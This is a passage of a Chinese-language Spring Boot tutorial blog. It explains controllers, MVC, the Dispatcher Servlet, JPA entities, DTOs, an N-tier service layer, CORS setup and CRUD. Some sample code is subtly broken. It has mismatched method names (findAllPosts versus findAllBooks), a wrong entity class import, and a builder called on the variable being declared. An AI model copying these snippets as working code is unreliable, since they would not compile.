&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">template</span> <span class="operator">=</span> <span class="string">&quot;Hello, %s!&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">final</span> <span class="type">AtomicLong</span> <span class="variable">counter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">AtomicLong</span>();</span><br><span class="line"></span><br><span class="line">    <span class="meta">@GetMapping(&quot;/greeting&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Greeting <span class="title function_">greeting</span><span class="params">(<span class="meta">@RequestParam(value = &quot;name&quot;, defaultValue = &quot;World&quot;)</span> String name)</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">Greeting</span>(counter.incrementAndGet(), String.format(template, name));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>解释一下 <code>@GetMapping(&lt;path&gt;)</code>：保证所以筛选到 <code>&lt;path&gt;</code> 路径的 GET 请求被框架统一转发给被修饰的方法（这里是 <code>greeting</code>）。</p><p>其中，如果要处理 HTTP 尾缀参数，那么被 <code>@GetMapping</code> 修饰的方法强烈建议使用 <code>@RequestParam(&lt;value&gt;, &lt;defaultValue&gt;)</code> 修饰参数，这样能清楚地知道处理参数的情况。</p><p>例如上面的例子中，Servlet 能识别 <code>GET /greeting</code> 的请求，并且调用后端程序的 <code>greeting</code> 方法。返回的 record 对象会被框架自动解析并以 JSON 形式响应客户端（浏览器）。</p><p>由于方法中写了 <code>@RequestParam</code>，因此可以接受任何 <code>/greeting?name=&lt;...&gt;</code> 的后缀参数信息。</p><blockquote><p>除了这里的 <code>@GetMapping</code>，还有 <code>@PostMapping</code>（对应 POST 请求）等等。</p><p>此外，<code>@RequestMapping(method=GET)</code> 等价于 <code>@GetMapping</code>，相当于是其他各种 Mapping 的综合体。</p></blockquote><p>另外，我们使用了 <code>AtomicLong</code> 类型，保证多线程情况下的安全性。<code>counter</code> 为当前运行时请求编号；</p><p>最后，还需要说明，这个类只有使用 <code>@RestController</code> 注解才能发挥作用。</p><p>它的作用是标识这个类作为一个 RESTful API 的资源接收和控制器，并且<u>其中的每个方法都会返回 domain object，而不是一个 view（视图，传统 MVC Controller 都会返回视图）</u>。这个注解等价于 <code>@Controller</code> 和 <code>@ResponseBody</code>（表示这里生成的是 HTTP 响应体）联合使用。</p><p>实际上，使用 <code>@RestController</code> 修饰的类中每个方法返回的 domain object 应该被转为 JSON（就是这里的 Greeting 对象应该转为 JSON）。但是因为有一个库 <code>Jackson 2</code> 的存在，Spring 会自动选择 <code>MappingJackson2HttpMessageConverter</code> 来将 record 实例转为 JSON。</p><p>最后，我们创建一个 <code>main</code> 函数来启动服务：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.SpringApplication;</span><br><span class="line"><span class="keyword">import</span> org.springframework.boot.autoconfigure.SpringBootApplication;</span><br><span class="line"></span><br><span class="line"><span class="meta">@SpringBootApplication</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">RestServiceApplication</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        SpringApplication.run(RestServiceApplication.class, args);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意到，<code>@SpringBootApplication</code> 相当于以下 3 个注解的结合：</p><ul><li><p><code>@Configuration</code>：将被修饰的类标记为当前 Application 上下文的 Bean 的定义方；</p><blockquote><p>回忆 DI（依赖注入），这里相当于产生 Bean（之前的 Record 类型）的类型。</p></blockquote></li><li><p><code>@EnableAutoConfiguration</code>: 告诉 Spring Boot 根据当前 classpath 中的设置来开始注入 beans，以及其他属性设置。例如，如果 <code>spring-webmvc</code> 在 classpath 中，那么这个注解的含义就是将这个类标记为 Web Application，并且激活一些重要的行为，例如设置启动 <code>DispatcherSevlet</code>；</p></li><li><p><code>@ComponentScan</code>：告诉 Sping 来查找其他的在 <code>priv/demo</code> 中的组件、设置和服务包，并且找到 Controller；</p></li></ul><h2 id="1-2-What-is-MVC"><a href="#1-2-What-is-MVC" class="headerlink" title="1.2 What is MVC?"></a>1.2 What is MVC?</h2><p>MVC 是一种软件设计架构模式，大多数时候应用在 Web Application 中，主要分为 3 层：</p><ul><li>Control Layer：软件控制层。如果用在 Web App 上，这层的职责是<u><strong>解析</strong>从 Web Server 传来的对特定 URL 的请求，并转发给服务程序的相应逻辑块</u>；</li><li>Model Layer：软件模型层。实际上的职责是<u>软件的数据表示</u>（就是对关系型数据库中存储的数据以及表单进行面向对象的表述），能让你轻松地从数据库中取出数据后放入对象中，并且轻松地展示在 Web 页面上；</li><li>View Layer：软件视图层。在传统的 Web 应用架构中，前端的程序主导了这个任务（比如 React、Anngular）。但是在 MVC 架构中，这部分位于后端，并且它的职责是<u>收到从数据库传来的数据，并将其组织在 Web 页面上</u>。</li></ul><h2 id="1-3-What-is-Dispatcher-Servlet"><a href="#1-3-What-is-Dispatcher-Servlet" class="headerlink" title="1.3 What is Dispatcher Servlet?"></a>1.3 What is Dispatcher Servlet?</h2><p>在 Spring MVC 中，有些东西不解释清楚就没法开始。比如一个 Spring MVC 中的概念 Dispatcher Servlet。</p><p>我们知道，Servlet 就是一种 Web Server 和 Web App 间的接口。在 Web App 软件层面只要按照 Servlet 接口实现一个 Servlet 就能与 Web Server 直接交互。</p><p>所谓的 Dispatcher Servlet 是一种编码模式（code pattern），也是 Servlet 的一种实现方式，在 MVC 架构中，作为 Control Layer 的一部分。</p><p>它在概念上主要完成了一件重要的事情：<strong>Request Handling &amp; Mapping</strong>。</p><p>Dispatcher Servlet 实现了 Servlet 接口，能给接收从 Web Server 传来的 HTTP 请求。当一个请求到达 Spring MVC Application 时，它会首先到达 Control Layer 的 Dispatcher Servlet。</p><p>Dispatcher Servlet 会根据 Spring Framework 对于请求的配置（底层配置在 <code>web.xml</code> 中，但 Spring MVC 已经包装在了像 <code>@ReuqestMapping</code> 一类的注解中了），映射（map）到相应的 Controller 中（通常被包装为一个方法）进行处理。</p><p>此后，收到 Dispatcher Servlet 请求的 controller 中会对传入的数据进行详细处理，例如处理请求参数、访问数据库、准备响应体等等。</p><p>再然后，Controller 会将处理好的数据交给指定的 view 进行组装。这里的 View Layer 会生成像 JSP / Thymeleaf templates / JSON 之类的数据结构，并且发送。</p><blockquote><p>Dispatcher Servlet 的这种职责实际上也是采用了一种编码模式，叫做 Front Controller。</p></blockquote><h2 id="1-4-What-does-Models-actually-do"><a href="#1-4-What-does-Models-actually-do" class="headerlink" title="1.4 What does Models actually do?"></a>1.4 What does Models actually do?</h2><p>在 Spring MVC 中，显然一个 Model 作为软件的数据表示，是一个至关重要的部分。但同时也是 Spring MVC 包装较好的部分、较简单的部分。</p><p>一个 Model 通常可以是一个 “POJO”（Plain Old Java Class / Object）；</p><blockquote><p>什么是 POJO？</p><p>Plain Old Java Object 特指那些 <strong>不用 extends / implements 其他外部框架的、不使用外部框架的 annotation 的 Java 类型</strong>。</p><p>简言之，你能不依赖框架写出的手写 Java 类型的实例都是 POJO。例如 Java Bean 就是典型的 POJO（允许 extends Java 原生接口，例如 <code>Serializable</code>）。</p><p>使用 POJO 的优势是，POJO 能够更加贴近、关注业务逻辑，不依赖外部框架代码（与外部框架解耦），不需要考虑外部代码对它的隐式影响。</p></blockquote><p>不过 Model 所包含的功能不止于用 POJO 保存信息，它还要完成一个重要的职责：<u>将 POJO 与关系型数据库表建立关联</u>（这个过程由 Spring JPA 模块完成）。</p><p>那么，接下来如何让 Spring Framework 知道这个 POJO 对应的类型是个 Model，并且如何将 POJO 由 JPA 映射为关系型数据库的表记录呢？</p><p>一般需要做 3 件事：</p><ol><li><p>确定描述 Model 的 POJO 类型。这件事就在告诉 Spring，这个类是个表示数据的类（即 Model），等会 JPA 可以按照这个类型创建关系型数据库的表单；</p><blockquote><p>这件事既可以由 <code>XML</code> 配置来做，也可以由 Spring Boot 包装好的注解 <code>@Entity</code> 来做。</p><p>但是如果加了注解，原来的类就不再是 POJO 类型。所以为了便捷性，需要在规范上作出一些取舍。</p></blockquote></li><li><p>确定 Model 中的哪个数据域为 POJO 的唯一识别符。这个表示建议 JPA 在创建数据库表时，将这个数据类型作为表的 <u>主键</u>；</p><blockquote><p>同样，这件事既可以由 <code>XML</code> 配置来做，也可以由 Spring Boot 包装好的注解 <code>@Id</code> 来做。</p></blockquote></li><li><p>决定 Model 中的哪些数据域是需要框架 / 驱动来生成的，而不是用户（Requests）传入的。这个告诉 JPA，这个数据域外部不会给定，应该由程序根据情况生成。</p><blockquote><p>举个例子，你可能在第二条中，想要为每个同类型的 POJO 维护一个全局唯一的 id，但这个 id 肯定不能由用户指定，通常是数据库的自增键来自动生成。</p><p>在 Spring Boot 中，提供了 <code>@GeneratedValue</code> 注解，相当于告诉 JPA，这个数据域应该生成而不是传入得到（通常是通过数据库当前的信息判断出来）。默认行为是在 JPA 生成数据库表时，将被修饰的数据域生成成为 “auto increment”（这种数据域被称为 database indentity）；</p></blockquote></li></ol><p>举个例子：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> jakarta.persistence.*;</span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.annotations.CreationTimestamp;</span><br><span class="line"><span class="keyword">import</span> org.hibernate.annotations.UpdateTimestamp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span>   <span class="comment">/* Equivalent to @Getter @Setter @RequiredArgsConstructor @ToString @EqualsAndHashCode.  */</span></span><br><span class="line"><span class="meta">@NoArgsConstructor</span></span><br><span class="line"><span class="meta">@AllArgsConstructor</span></span><br><span class="line"><span class="meta">@Builder</span>    <span class="comment">/* Generate ClassBuilder static class */</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@Entity</span></span><br><span class="line"><span class="meta">@Table(name = &quot;posts&quot;)</span>  <span class="comment">/* Tell JPA to generate data into named table &#x27;books&#x27;. */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostInfo</span> &#123;</span><br><span class="line">    <span class="meta">@Id</span> <span class="comment">/* Equivalent to: UNIQUE + NOT NULL + IMMUTABLE */</span></span><br><span class="line">    <span class="comment">/* It relies on an auto-incremented database column</span></span><br><span class="line"><span class="comment">     * and lets the database generate a new value with each insert operation.</span></span><br><span class="line"><span class="comment">     * But, this prevents it from using different optimization techniques like JDBC batching. */</span></span><br><span class="line">    <span class="meta">@GeneratedValue(strategy = GenerationType.IDENTITY)</span></span><br><span class="line">    <span class="keyword">private</span> Long postId;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@CreationTimestamp</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime createdOn;</span><br><span class="line">    <span class="meta">@UpdateTimestamp</span></span><br><span class="line">    <span class="keyword">private</span> LocalDateTime updatedOn;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-5-N-Tier-Architecture"><a href="#1-5-N-Tier-Architecture" class="headerlink" title="1.5 N-Tier Architecture"></a>1.5 N-Tier Architecture</h2><blockquote><p>前置知识：什么是 DTO？</p><p>在 MVC 架构中，有一种对象称数据转移对象（Data Transfer Object）。它的作用是在 Application 的不同层级 / 子系统间传输数据。</p><p>DTO 尤其常用在 N-Tiers 中使用，其好处是减少数据在各部分传输的量，使得程序信息能清晰地相互传输。具体的应用场景如下：</p><ul><li>假设数据库中原本抽象出的对象有很多属性，但是我在某些层级间传输时，只需要用到一部分。那么就没有必要把对象整体传来传去：我们可以定义一个 DTO 类型，属性是原类型的子集，使得功能清晰、传参无负担；</li><li>假设有个方法需要传入 4 个以上参数，那么写方法签名、手动传参就不现实。可以定义一个 DTO 类型来向其传参，语义更清晰；</li></ul><p>所以，DTO 就是一种普通的类型，提取了某个类型的一些属性。</p><p>例如，上一节定义的 <code>PostInfo</code> 中，有一些数据现在不需要在 App 中传输，那么可以这么定义：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.Builder;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Data</span></span><br><span class="line"><span class="meta">@Builder</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostDto</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> Long postId;</span><br><span class="line">    <span class="keyword">private</span> String title;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></blockquote><p>在软件工程中有个非常有趣的事实是，90% 的时候都无需使用软件工程的设计原理（software engineering design patterns），但是应用在底层的架构设计是恰恰又需要用到。</p><p>有一种软件设计架构叫 N-Tier（或者说 N-Tier Repository Pattern，Multi-Tier Architecture），也是接下来我们想要实践的架构。它是一种 C/S 架构设计模式，最广泛的使用方法是将其分为 3 个部分：</p><ul><li><p>Data Tier（Repository）：以 Web 开发为例，通常在 Java 后端服务中，此层是管理数据库的部分（在 Java 中通常封装为一个类型）。它通常具有 CRUD 四种方法，并且充当了在数据库表结果 和 对象之间转换的桥梁；</p><blockquote><p>在 Spring JPA 中提供了一个接口 <code>JpaRepository&lt;EntityType, EntityIdType&gt;</code> 轻松定义 custom query method（这样我们可通过方法名判断出对应的 SQL 语句）。例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.models.PostInfo;</span><br><span class="line"><span class="keyword">import</span> org.springframework.data.jpa.repository.JpaRepository;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostRepository</span> <span class="keyword">extends</span> <span class="title class_">JpaRepository</span>&lt;PostInfo, Long&gt; &#123;</span><br><span class="line"> Optional&lt;PostInfo&gt; <span class="title function_">findByPostId</span><span class="params">(Long postId)</span>;</span><br><span class="line"> List&lt;PostInfo&gt; <span class="title function_">findByTitle</span><span class="params">(String title)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，<code>PostRepository</code> 又称 DAO（Data Access Object）类型。DAO 和 DTO 一样，也是一种编码模式（code pattern），它的作用是使用一组 API 将 application tier / bussiness logic 与 persistence layer 隔离开，达到模块解耦的作用。</p></blockquote></li><li><p>Application Tier（Bussiness Logic）：以 Web 开发为例，通常在 Java 后端服务中，此层是通常是 Spring 框架中处理数据的业务逻辑部分；</p><blockquote><p>在使用 Spring MVC 时，除了我们直接写 Controllers 外，还建议抽象出一层 “Service”（服务层），这样可以把处理特定的数据库操作与业务逻辑解耦（即可以表示处理特定业务逻辑所需的操作），这样项目功能改变时就不用担心大幅度改代码，只需要到实现功能的 service 中改动就行，不会有 ”这块代码是干什么“ 的担忧。</p><p>例如：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo.services;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.dto.PostDto;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">interface</span> <span class="title class_">PostService</span> &#123;</span><br><span class="line"> <span class="comment">/* Use predefined DTO in services */</span></span><br><span class="line"> List&lt;PostDto&gt; <span class="title function_">findAllPosts</span><span class="params">()</span>;</span><br><span class="line"> Optional&lt;PostDto&gt; <span class="title function_">findPostsById</span><span class="params">(Long id)</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这样，我们再实现这个接口，注意因为服务抽象肯定需要 repository 的数据库操作，因此需要与 <code>JpaRepository</code> 组合。这个时候就用到了 Spring 的依赖注入的特性，让模块解耦：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo.services.impl;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> priv.demo.dto.PostDto;</span><br><span class="line"><span class="keyword">import</span> priv.demo.models.Post;</span><br><span class="line"><span class="keyword">import</span> priv.demo.repositories.PostRepository;</span><br><span class="line"><span class="keyword">import</span> priv.demo.services.PostService;</span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"><span class="keyword">import</span> java.util.Optional;</span><br><span class="line"><span class="keyword">import</span> java.util.stream.Collectors;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Service</span>    <span class="comment">/* provide Spring with PostSerivce Bean */</span></span><br><span class="line">            <span class="comment">/* (可以在写 Controller 时再回来添加)  */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">PostServiceImpl</span> <span class="keyword">implements</span> <span class="title class_">PostService</span> &#123;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Use Jpa Repository to achieve goals */</span></span><br><span class="line"> PostRepository postRepository;</span><br><span class="line"></span><br><span class="line"> <span class="comment">/* Use Spring Dependency Injection: inject repo to de-couple dependencies. */</span></span><br><span class="line"> <span class="comment">/* Also, we need to provide repository from other area.</span></span><br><span class="line"><span class="comment">     * Here we provide Spring with repo in  */</span></span><br><span class="line">    <span class="meta">@Autowired</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">PostServiceImpl</span><span class="params">(PostRepository repository)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.postRepository = repository;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> List&lt;PostDto&gt; <span class="title function_">findAllBooks</span><span class="params">()</span> &#123;</span><br><span class="line">        List&lt;PostInfo&gt; posts = postRepository.findAll();</span><br><span class="line">        <span class="keyword">return</span> posts.stream().map((post -&gt; mapToPostDto(post))).collect(Collectors.toList());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> Optional&lt;PostDto&gt; <span class="title function_">findPostsById</span><span class="params">(Long id)</span> &#123;</span><br><span class="line">        Optional&lt;Post&gt; src = postRepository.findByPostId(id);</span><br><span class="line">        <span class="keyword">return</span> (src.map(PostServiceImpl::mapToPostDto));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/** <span class="doctag">@implNote</span> Private self-defined mapper.</span></span><br><span class="line"><span class="comment">     *  Covert model (database representation) to DTO (app representation).</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> PostDto <span class="title function_">mapToPostDto</span><span class="params">(PostInfo post)</span> &#123;</span><br><span class="line">        <span class="type">PostDto</span> <span class="variable">postDto</span> <span class="operator">=</span> postDto.builder()</span><br><span class="line">                .postId(post.getPostId())</span><br><span class="line">                .title(post.getTitle())</span><br><span class="line">                .build();</span><br><span class="line">        <span class="keyword">return</span> postDto;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>注意，以上从 <code>PostInfo</code>（数据库表示，即 model）向 <code>PostDto</code>（应用程序传输表示，即 DTO）转换时，需要自定义 <code>mapToPostDto</code> 的方法。</p><p>此外，在数组元素处理时，我们还使用了 Java 中类似 JavaScript 的处理方法 <code>map</code>，对数组每个元素的处理方法就变简单了：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">List&lt;T&gt;.stream().map(&lt;mapFunc&gt;);    <span class="comment">/* 返回映射后的 Stream 对象 */</span></span><br><span class="line">Stream.collect(Collectors.toList());    <span class="comment">/* 将产生的 Stream 对象转换回 List&lt;T&gt; */</span></span><br></pre></td></tr></table></figure><p>再聊聊 Controllers 的部分。后面的数据布置都已清晰，剩下来还要布置 Controller 处理 Web Server 发来的请求。</p><p>除了在在 1.1 中见到的 <code>@RestController</code> 可以创建普通的 REST Controller 以外，还有普通的 Controller <code>@Controller</code>（少了将 Controller 方法组织成资源返回值的方法）；</p><p>此外，<code>@RequestMapping()</code> 可以使用、<code>@GetMapping/@PostMapping/@DeleteMapping/...</code> 注解也可以使用。</p></blockquote></li><li><p>Presentation Tier（Frontend）：以 Web 开发为例，通常在前端服务中，此层就是渲染 Web Page 页面的部分，可以由 React 等框架解决。</p></li></ul><h2 id="1-6-CRUD-Read-Data"><a href="#1-6-CRUD-Read-Data" class="headerlink" title="1.6 CRUD: Read Data"></a>1.6 CRUD: Read Data</h2><p>以上的所有知识已经足够我们将前端、后端连接起来。当然，后端如果要处理数据，还得把接下来几节学完。</p><p>现在让我们一起巩固所学，将前端和后端连接起来，先了解 “前端读取后端数据” 的效果如何达成。</p><p>首先，我们由上面的示例，已经能利用 JPA 从数据库中获取数据，并且呈现 JSON 结果了。因此我们只需要修改事先写好的前端，加入 <code>fetch</code> API，读取从后端传来的数据，再呈现在页面上即可。只要你完全了解了上面的理论，那么 read data 就是简单地在前端加上 <code>fetch</code> 获取资源，仅此而已。</p><p>值得注意的是，如果你做的项目也是前后端分离的（服务在不同端口上），那么 CORS 将会是一大问题。请自行查阅资料解决，笔者贴上自己的解决方案（Spring Boot）：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> priv.demo;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Bean;</span><br><span class="line"><span class="keyword">import</span> org.springframework.context.annotation.Configuration;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.CorsRegistry;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.servlet.config.annotation.WebMvcConfigurer;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Configuration</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Configurations</span> &#123;</span><br><span class="line">    <span class="meta">@Bean</span></span><br><span class="line">    <span class="keyword">public</span> WebMvcConfigurer <span class="title function_">corsMappingConfigurer</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">WebMvcConfigurer</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addCorsMappings</span><span class="params">(CorsRegistry registry)</span> &#123;</span><br><span class="line">                registry.addMapping(<span class="string">&quot;/**&quot;</span>)</span><br><span class="line">                        <span class="comment">/* Frontend server runs at localhost:3000 */</span></span><br><span class="line">                        .allowedOrigins(<span class="string">&quot;http://localhost:3000&quot;</span>)</span><br><span class="line">                        .allowedMethods(<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>, <span class="string">&quot;PATCH&quot;</span>, <span class="string">&quot;PUT&quot;</span>, <span class="string">&quot;DELETE&quot;</span>, <span class="string">&quot;OPTIONS&quot;</span>, <span class="string">&quot;HEAD&quot;</span>)</span><br><span class="line">                        .maxAge(<span class="number">3600</span>)</span><br><span class="line">                        .allowedHeaders(<span class="string">&quot;*&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="1-7-Validation-in-Backend"><a href="#1-7-Validation-in-Backend" class="headerlink" title="1.7 Validation in Backend"></a>1.7 Validation in Backend</h2><p>在后端的 DTO 类型中，往往可以添加许多注解来代替我们完成繁琐且常见的数据校验操作，例如：</p><p><code>@NotNull</code>, <code>@NotBlank</code>, <code>@NotEmpty</code>, <code>@Email</code>, <code>@Min</code>, <code>@Max</code>, <code>@Size</code>, <code>@Pattern</code>, <code>@Phone</code>, <code>@Past</code>；</p><p>以上是库 <code>spring-boot-starter-validation</code> 的校验注解，需要自行安装。但由于它们注解在类的属性上，所以只有当你在 Controller 中获取表单参数时加入 <code>@Valid</code>，并配合 <code>BindingResult</code>（请添加第二参数）才会使这些注解生效。</p><h2 id="1-8-CRUD-Create-Data-Update-Data"><a href="#1-8-CRUD-Create-Data-Update-Data" class="headerlink" title="1.8 CRUD: Create Data / Update Data"></a>1.8 CRUD: Create Data / Update Data</h2><p>用户可能会通过表单向前端提交数据，这个过程通常会造成数据库的某些信息的修改。因此，我们有必要了解一下从前端传入数据，到后端修改数据的过程。</p><p>本节先对 “CRUD” 中的 Create 进行介绍，介绍在以上的 N-Tiers 架构设计中，Create 动作是如何完成的。</p><p>通常情况下，用户会在前端的 <code>&lt;form&gt; &gt; &lt;input&gt;</code> 中填写数据，再 submit，前端会使用 <code>fetch</code> API 向后端发送表单信息。</p><p>对于 Create Data 而言，常常不是幂等的，因此使用 <code>PostMapping</code>，而 Update Data 而言大多数情况下是幂等的，因此使用 <code>PutMapping</code>；</p><p>在 JPA 中，对于简单的数据表而言，一条 <code>repository.save(Entity)</code> 即可完成创建或者更新的操作。</p><h2 id="1-9-CRUD-Delete-Data"><a href="#1-9-CRUD-Delete-Data" class="headerlink" title="1.9 CRUD: Delete Data"></a>1.9 CRUD: Delete Data</h2><p>对于 JPA 的简单表而言，一条 <code>repository.delete(Entity)</code> 即可完成任务。</p><h2 id="1-10-JPQL-Search-Data"><a href="#1-10-JPQL-Search-Data" class="headerlink" title="1.10 JPQL: Search Data"></a>1.10 JPQL: Search 